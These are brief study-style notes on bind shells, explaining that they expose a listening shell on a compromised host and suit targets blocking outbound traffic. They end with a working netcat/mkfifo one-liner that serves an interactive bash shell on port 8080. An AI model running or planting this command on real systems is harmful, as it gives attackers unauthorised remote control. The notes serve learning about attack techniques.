- bind a port on compromised system and listen for a connection, exposes shell so that attacker can connect
- can be used when target does not allow outgoing connections
- easier to detect
- To create a bind shell:
```shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```